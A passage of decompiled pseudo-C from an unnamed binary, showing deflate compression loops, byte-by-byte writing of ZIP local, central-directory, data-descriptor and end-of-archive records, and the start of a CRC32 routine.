                    *(int *)((int)in_EAX + 0x6af7c) << 5) & 0x7fff;
            *(uint *)((int)in_EAX + 0x6af7c) = uVar1;
            local_8 = *(int *)((int)in_EAX + uVar1 * 4 + 0x4af70);
            uVar4 = uVar4 - 1;
            *(int *)((int)in_EAX + (*(uint *)((int)in_EAX + 0x6af84) & 0x7fff) * 4 + 0x2af70) =
                 local_8;
            *(undefined4 *)((int)in_EAX + *(int *)((int)in_EAX + 0x6af7c) * 4 + 0x4af70) =
                 *(undefined4 *)((int)in_EAX + 0x6af84);
          } while (uVar4 != 0);
          *(int *)((int)in_EAX + 0x6af84) = *(int *)((int)in_EAX + 0x6af84) + 1;
        }
        else {
          *(int *)((int)in_EAX + 0x6af84) = *(int *)((int)in_EAX + 0x6af84) + uVar4;
          uVar1 = (uint)*(byte *)(*(int *)((int)in_EAX + 0x6af84) + 0x1af70 + (int)in_EAX);
          *(uint *)((int)in_EAX + 0x6af7c) = uVar1;
          uVar4 = 0;
          *(uint *)((int)in_EAX + 0x6af7c) =
               (uint)*(byte *)(*(int *)((int)in_EAX + 0x6af84) + 0x1af71 + (int)in_EAX) ^ uVar1 << 5
          ;
        }
      }
      if (iVar2 != 0) {
        if (*(int *)((int)in_EAX + 0x6af74) < 0) {
          puVar3 = (undefined4 *)0x0;
        }
        else {
          puVar3 = (undefined4 *)(*(int *)((int)in_EAX + 0x6af74) + 0x1af70 + (int)in_EAX);
        }
        FUN_003aae80(in_EAX,puVar3);
        *(undefined4 *)((int)in_EAX + 0x6af74) = *(undefined4 *)((int)in_EAX + 0x6af84);
      }
      if (*(uint *)((int)in_EAX + 0x6af90) < 0x106) {
        FUN_003ab8f0();
      }
    } while (*(int *)((int)in_EAX + 0x6af90) != 0);
  }
  if (*(int *)((int)in_EAX + 0x6af74) < 0) {
    puVar3 = (undefined4 *)0x0;
  }
  else {
    puVar3 = (undefined4 *)(*(int *)((int)in_EAX + 0x6af74) + 0x1af70 + (int)in_EAX);
  }
  FUN_003aae80(in_EAX,puVar3);
  return;
}



void FUN_003abc90(void)

{
  int *piVar1;
  int iVar2;
  bool bVar3;
  void *in_EAX;
  uint uVar4;
  int iVar5;
  int iVar6;
  undefined4 *puVar7;
  uint uVar8;
  int local_c;
  
  local_c = 0;
  bVar3 = false;
  uVar8 = 2;
  if (*(int *)((int)in_EAX + 4) < 4) {
    FUN_003aba30();
    return;
  }
  if (*(int *)((int)in_EAX + 0x6af90) != 0) {
    do {
      if (2 < *(uint *)((int)in_EAX + 0x6af90)) {
        uVar4 = ((uint)*(byte *)(*(uint *)((int)in_EAX + 0x6af84) + 0x1af72 + (int)in_EAX) ^
                *(int *)((int)in_EAX + 0x6af7c) << 5) & 0x7fff;
        *(uint *)((int)in_EAX + 0x6af7c) = uVar4;
        local_c = *(int *)((int)in_EAX + uVar4 * 4 + 0x4af70);
        *(int *)((int)in_EAX + (*(uint *)((int)in_EAX + 0x6af84) & 0x7fff) * 4 + 0x2af70) = local_c;
        *(undefined4 *)((int)in_EAX + *(int *)((int)in_EAX + 0x6af7c) * 4 + 0x4af70) =
             *(undefined4 *)((int)in_EAX + 0x6af84);
      }
      *(uint *)((int)in_EAX + 0x6af80) = uVar8;
      uVar8 = 2;
      if (((local_c != 0) && (*(uint *)((int)in_EAX + 0x6af80) < *(uint *)((int)in_EAX + 0x6af98)))
         && ((uint)(*(int *)((int)in_EAX + 0x6af84) - local_c) < 0x7efb)) {
        uVar8 = *(uint *)((int)in_EAX + 0x6af90);
        if (uVar8 <= *(uint *)((int)in_EAX + 0x6afa0) && *(uint *)((int)in_EAX + 0x6afa0) != uVar8)
        {
          *(uint *)((int)in_EAX + 0x6afa0) = uVar8;
        }
        uVar8 = FUN_003ab7a0();
        if (*(uint *)((int)in_EAX + 0x6af90) < uVar8) {
          uVar8 = *(uint *)((int)in_EAX + 0x6af90);
        }
        if ((uVar8 == 3) &&
           (0x1000 < (uint)(*(int *)((int)in_EAX + 0x6af84) - *(int *)((int)in_EAX + 0x6af88)))) {
          uVar8 = 2;
        }
      }
      uVar4 = *(uint *)((int)in_EAX + 0x6af80);
      if ((uVar4 < 3) || (uVar4 < uVar8)) {
        if (bVar3) {
          iVar6 = FUN_003ab020((int)in_EAX,
                               (uint)*(byte *)(*(int *)((int)in_EAX + 0x6af84) + 0x1af6f +
                                              (int)in_EAX));
          if (iVar6 != 0) {
            if (*(int *)((int)in_EAX + 0x6af74) < 0) {
              puVar7 = (undefined4 *)0x0;
            }
            else {
              puVar7 = (undefined4 *)(*(int *)((int)in_EAX + 0x6af74) + 0x1af70 + (int)in_EAX);
            }
            FUN_003aae80(in_EAX,puVar7);
            *(undefined4 *)((int)in_EAX + 0x6af74) = *(undefined4 *)((int)in_EAX + 0x6af84);
          }
          *(int *)((int)in_EAX + 0x6af84) = *(int *)((int)in_EAX + 0x6af84) + 1;
        }
        else {
          *(int *)((int)in_EAX + 0x6af84) = *(int *)((int)in_EAX + 0x6af84) + 1;
          bVar3 = true;
        }
        *(int *)((int)in_EAX + 0x6af90) = *(int *)((int)in_EAX + 0x6af90) + -1;
      }
      else {
        iVar6 = *(int *)((int)in_EAX + 0x6af84);
        iVar2 = *(int *)((int)in_EAX + 0x6af90);
        iVar5 = FUN_003ab020((int)in_EAX,uVar4 - 3);
        *(int *)((int)in_EAX + 0x6af90) =
             *(int *)((int)in_EAX + 0x6af90) + (1 - *(int *)((int)in_EAX + 0x6af80));
        *(int *)((int)in_EAX + 0x6af80) = *(int *)((int)in_EAX + 0x6af80) + -2;
        do {
          *(int *)((int)in_EAX + 0x6af84) = *(int *)((int)in_EAX + 0x6af84) + 1;
          uVar8 = *(uint *)((int)in_EAX + 0x6af84);
          if (uVar8 <= (uint)(iVar6 + -3 + iVar2)) {
            uVar4 = ((uint)*(byte *)(uVar8 + 0x1af72 + (int)in_EAX) ^
                    *(int *)((int)in_EAX + 0x6af7c) << 5) & 0x7fff;
            *(uint *)((int)in_EAX + 0x6af7c) = uVar4;
            local_c = *(int *)((int)in_EAX + uVar4 * 4 + 0x4af70);
            *(int *)((int)in_EAX + (uVar8 & 0x7fff) * 4 + 0x2af70) = local_c;
            *(undefined4 *)((int)in_EAX + *(int *)((int)in_EAX + 0x6af7c) * 4 + 0x4af70) =
                 *(undefined4 *)((int)in_EAX + 0x6af84);
          }
          piVar1 = (int *)((int)in_EAX + 0x6af80);
          *piVar1 = *piVar1 + -1;
        } while (*piVar1 != 0);
        *(int *)((int)in_EAX + 0x6af84) = *(int *)((int)in_EAX + 0x6af84) + 1;
        puVar7 = (undefined4 *)0x0;
        bVar3 = false;
        uVar8 = 2;
        if (iVar5 != 0) {
          if (-1 < *(int *)((int)in_EAX + 0x6af74)) {
            puVar7 = (undefined4 *)(*(int *)((int)in_EAX + 0x6af74) + 0x1af70 + (int)in_EAX);
          }
          FUN_003aae80(in_EAX,puVar7);
          *(undefined4 *)((int)in_EAX + 0x6af74) = *(undefined4 *)((int)in_EAX + 0x6af84);
          uVar8 = 2;
        }
      }
      if (*(uint *)((int)in_EAX + 0x6af90) < 0x106) {
        FUN_003ab8f0();
      }
    } while (*(int *)((int)in_EAX + 0x6af90) != 0);
    if (bVar3) {
      FUN_003ab020((int)in_EAX,
                   (uint)*(byte *)(*(int *)((int)in_EAX + 0x6af84) + 0x1af6f + (int)in_EAX));
    }
  }
  if (*(int *)((int)in_EAX + 0x6af74) < 0) {
    puVar7 = (undefined4 *)0x0;
  }
  else {
    puVar7 = (undefined4 *)(*(int *)((int)in_EAX + 0x6af74) + 0x1af70 + (int)in_EAX);
  }
  FUN_003aae80(in_EAX,puVar7);
  return;
}



// WARNING: Could not reconcile some variable overlaps

undefined4 __fastcall FUN_003abf80(undefined3 param_1)

{
  uint uVar1;
  void *unaff_ESI;
  int unaff_EDI;
  uint uStack8;
  
  uStack8 = CONCAT13(0x50,param_1);
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = CONCAT13(0x4b,(undefined3)uStack8);
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = CONCAT13(3,(undefined3)uStack8);
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = CONCAT13(4,(undefined3)uStack8);
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 2) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 3) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x2c) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x2d) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 6) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 7) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 8) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 9) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 10) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0xb) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0xc) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0xd) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0xe) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0xf) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x10) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x11) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x12) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x13) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x14) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x15) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x16) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x17) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x18) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (*(uint *)(unaff_EDI + 0x18) >> 8) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x1c) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (*(uint *)(unaff_EDI + 0x1c) >> 8) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uVar1 = *(uint *)(unaff_EDI + 0x18);
  if (uVar1 != 0) {
    uVar1 = FUN_003ace90(unaff_ESI,(undefined4 *)(unaff_EDI + 0x148),uVar1);
  }
  if (uVar1 == *(uint *)(unaff_EDI + 0x18)) {
    if ((*(uint *)(unaff_EDI + 0x1c) != 0) &&
       (uVar1 = FUN_003ace90(unaff_ESI,*(undefined4 **)(unaff_EDI + 0x13c),
                             *(uint *)(unaff_EDI + 0x1c)), uVar1 != *(uint *)(unaff_EDI + 0x1c))) {
      return 10;
    }
    return 0;
  }
  return 10;
}



// WARNING: Could not reconcile some variable overlaps

undefined4 __fastcall FUN_003ac220(undefined3 param_1)

{
  void *unaff_ESI;
  int unaff_EDI;
  uint uStack8;
  
  uStack8 = CONCAT13(0x50,param_1);
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = CONCAT13(0x4b,(undefined3)uStack8);
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = CONCAT13(7,(undefined3)uStack8);
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = CONCAT13(8,(undefined3)uStack8);
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0xc) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0xd) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0xe) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0xf) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x10) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x11) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x12) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x13) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x14) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x15) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x16) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*(byte *)(unaff_EDI + 0x17) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&uStack8 + 3),1);
  return 0;
}



// WARNING: Could not reconcile some variable overlaps

undefined4 __fastcall FUN_003ac360(undefined3 param_1)

{
  uint uVar1;
  byte *unaff_ESI;
  void *unaff_EDI;
  uint uStack8;
  
  uStack8 = CONCAT13(0x50,param_1);
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = CONCAT13(0x4b,(undefined3)uStack8);
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = CONCAT13(1,(undefined3)uStack8);
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = CONCAT13(2,(undefined3)uStack8);
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)*unaff_ESI << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[1] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[2] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[3] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[4] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[5] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[6] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[7] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[8] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[9] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[10] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0xb] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0xc] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0xd] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0xe] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0xf] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x10] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x11] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x12] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x13] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x14] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x15] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x16] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x17] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x18] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (*(uint *)(unaff_ESI + 0x18) >> 8) << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x20] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (*(uint *)(unaff_ESI + 0x20) >> 8) << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x24] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (*(uint *)(unaff_ESI + 0x24) >> 8) << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x28] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x29] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x2a] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x2b] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x30] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x31] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x32] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x33] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x34] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x35] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x36] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uStack8 = uStack8 & 0xffffff | (uint)unaff_ESI[0x37] << 0x18;
  FUN_003ace90(unaff_EDI,(undefined4 *)((int)&uStack8 + 3),1);
  uVar1 = *(uint *)(unaff_ESI + 0x18);
  if (uVar1 != 0) {
    uVar1 = FUN_003ace90(unaff_EDI,(undefined4 *)(unaff_ESI + 0x148),uVar1);
  }
  if (uVar1 != *(uint *)(unaff_ESI + 0x18)) {
    return 10;
  }
  if ((*(uint *)(unaff_ESI + 0x20) != 0) &&
     (uVar1 = FUN_003ace90(unaff_EDI,*(undefined4 **)(unaff_ESI + 0x140),*(uint *)(unaff_ESI + 0x20)
                          ), uVar1 != *(uint *)(unaff_ESI + 0x20))) {
    return 10;
  }
  if ((*(uint *)(unaff_ESI + 0x24) != 0) &&
     (uVar1 = FUN_003ace90(unaff_EDI,*(undefined4 **)(unaff_ESI + 0x144),*(uint *)(unaff_ESI + 0x24)
                          ), uVar1 != *(uint *)(unaff_ESI + 0x24))) {
    return 10;
  }
  return 0;
}



undefined4 __cdecl FUN_003ac760(uint param_1,uint param_2)

{
  byte bVar1;
  uint in_EAX;
  void *unaff_ESI;
  byte local_5;
  
  local_5 = 0x50;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  local_5 = 0x4b;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  local_5 = 5;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  local_5 = 6;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  local_5 = 0;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  local_5 = 0;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  local_5 = 0;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  local_5 = 0;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  local_5 = (undefined)param_1;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  bVar1 = (byte)(param_1 >> 8);
  local_5 = bVar1;
  FUN_003ace90(unaff_ESI,(undefined4 *)&local_5,1);
  param_1 = param_1 & 0xffffff | param_1 << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_1 + 3),1);
  param_1 = param_1 & 0xffffff | (uint)bVar1 << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_1 + 3),1);
  param_1 = param_1 & 0xffffff | param_2 << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_1 + 3),1);
  param_1 = param_1 & 0xffffff | (param_2 >> 8) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_1 + 3),1);
  param_1 = param_1 & 0xffffff | (param_2 >> 0x10) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_1 + 3),1);
  param_1 = param_2 & 0xff000000 | param_1 & 0xffffff;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_1 + 3),1);
  param_2 = param_2 & 0xffffff | in_EAX << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_2 + 3),1);
  param_2 = param_2 & 0xffffff | (in_EAX >> 8) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_2 + 3),1);
  param_2 = param_2 & 0xffffff | (in_EAX >> 0x10) << 0x18;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_2 + 3),1);
  param_2 = in_EAX & 0xff000000 | param_2 & 0xffffff;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_2 + 3),1);
  param_2 = param_2 & 0xffffff;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_2 + 3),1);
  param_2 = param_2 & 0xffffff;
  FUN_003ace90(unaff_ESI,(undefined4 *)((int)&param_2 + 3),1);
  return 0;
}



uint __fastcall FUN_003ac910(byte *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  
  if (param_1 == (byte *)0x0) {
    return 0;
  }
  uVar1 = ~in_EAX;
  if (7 < param_2) {
    uVar2 = param_2 >> 3;
    do {
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((*param_1 ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((param_1[1] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((param_1[2] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((param_1[3] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((param_1[4] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((param_1[5] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((param_1[6] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((param_1[7] ^ uVar1) & 0xff) * 4);
      param_1 = param_1 + 8;
      param_2 = param_2 - 8;
      uVar2 = uVar2 - 1;
    } while (uVar2 != 0);
  }
  for (; param_2 != 0; param_2 = param_2 - 1) {
